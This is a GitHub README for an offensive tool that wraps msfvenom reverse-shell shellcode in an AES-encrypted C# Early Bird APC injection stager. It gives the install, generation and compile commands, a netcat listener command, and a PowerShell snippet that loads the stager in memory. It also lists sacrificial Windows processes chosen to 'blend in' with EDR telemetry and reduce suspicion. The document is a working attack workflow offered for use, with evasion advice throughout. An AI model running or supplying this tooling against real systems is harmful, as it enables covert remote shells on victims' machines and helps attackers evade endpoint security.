# ZumiLoader
Original idea and forked from https://github.com/ZumiYumi.

This is just a simple Python loader that generates a self-contained C# Early Bird APC injection stager. It calls `msfvenom` directly, encrypts the raw shellcode with AES-256-CBC using a randomly generated key and IV per run, and templates everything into a ready-to-compile `.cs` file — no manual variable editing required.

The generated binary spawns a sacrificial process in suspended state, allocates and writes the encrypted shellcode via NT-native syscalls. The APC fires before any user-mode code in the target process runs (Early Bird).

## Improvements over the original

**No more hardcoded variables.** The original required you to open the script and manually edit `LHOST`, `LPORT`, and `PAYLOAD` constants before every run. All three are now CLI flags, so the script is ready to use immediately after cloning with no file editing.

**Configurable sacrificial process.** The target process was hardcoded to `RuntimeBroker.exe` with no way to change it short of editing the source. It is now controlled via `--target`, accepting any Windows binary path. This matters in practice because the right sacrificial process depends on the environment — what looks plausible on a developer workstation is not the same as on a server or kiosk. See the `--target` section below for tested options.

**Configurable output filename.** The generated C# file was always written to `eos.cs`. The `--out` flag lets you name it whatever fits your workflow or op.

**Richer output.** The original only printed shellcode size and the compile hint. The script now prints a full parameter summary before doing anything, reports both raw shellcode size and encrypted size with the algorithm label, and dynamically fills the listener command with the actual port you passed — no more manually updating the port in the compile hint.

**Cleaner error handling.** `msfvenom` stderr is now captured and printed on failure instead of being swallowed, making it easier to diagnose bad payload strings or missing dependencies.

## 1. Install
```sh
git clone https://github.com/Y3llowDuck/ZumiLoader.git
cd ZumiLoader
pip install cryptography
```
## 2. Run Loader and Compile

`--lhost` and `--lport` are the only required flags. Everything else has a sane default.

```sh
python3 loader.py --lhost 10.10.15.170 --lport 443
```

| Flag | Required | Default | Description |
|---|---|---|---|
| `--lhost` | yes | — | Listener IP address passed to msfvenom |
| `--lport` | yes | — | Listener port passed to msfvenom |
| `--payload` | no | `windows/x64/shell_reverse_tcp` | Any msfvenom payload string, e.g. `windows/x64/meterpreter/reverse_tcp` |
| `--target` | no | `C:\\Windows\\System32\\RuntimeBroker.exe` | Sacrificial process spawned in suspended state — accepts any Windows binary path, see below |
| `--out` | no | `eos.cs` | Output filename for the generated C# source |

### Sacrificial Process (`--target`)

The target binary is spawned with `CREATE_SUSPENDED` and never meaningfully executes — it is just a host for the APC queue. Any legitimate Windows binary that can be started without arguments and won't immediately crash works. Picking a process that looks plausible for the environment reduces suspicion.

Tested and recommended options:

| Process | Path | Notes |
|---|---|---|
| `RuntimeBroker.exe` | `C:\\Windows\\System32\\RuntimeBroker.exe` | Default. Runs naturally in most user sessions |
| `svchost.exe` | `C:\\Windows\\System32\\svchost.exe` | Extremely common, blends in well in EDR telemetry |
| `WerFault.exe` | `C:\\Windows\\System32\\WerFault.exe` | Windows Error Reporting — rarely scrutinised |
| `dllhost.exe` | `C:\\Windows\\System32\\dllhost.exe` | COM surrogate, short-lived processes are normal |
| `notepad.exe` | `C:\\Windows\\System32\\notepad.exe` | Reliable on all versions, useful for quick tests |
| `mspaint.exe` | `C:\\Windows\\System32\\mspaint.exe` | GUI process, stays alive without input |

Avoid processes that require elevated privileges to spawn, check for parent process integrity, or that security products actively monitor for suspension patterns (e.g. `lsass.exe`, `csrss.exe`).

```sh
# Example with a custom target
python3 loader.py --lhost 10.10.15.170 --lport 443 --target "C:\\Windows\\System32\\WerFault.exe"
```

```sh
# EXAMPLE OUTPUT
# [*] Payload  : windows/x64/shell_reverse_tcp
# [*] LHOST    : 10.10.15.170
# [*] LPORT    : 443
# [*] Target   : C:\\Windows\\System32\\RuntimeBroker.exe
# [*] Output   : eos.cs
#
# [+] Shellcode : 460 bytes
# [+] Encrypted : 464 bytes (AES-256-CBC)
# [+] C# source written to eos.cs
#
# [*] Compile (x64, Windows):
#     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /unsafe /out:eos.exe eos.cs
# [*] Start listener:
#     sudo nc -lvnp 443
```

Compile the generated file on a Windows host:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /unsafe /out:eos.exe eos.cs
```

Or copy `eos.cs` into Visual Studio and build from there. Whatever you're comfortable with.
## Demo
Use PowerShell to run directly from memory.
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\users\public\eos.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, $null)
```
Or execute the compiled file directly:
![demo](./shell.png)
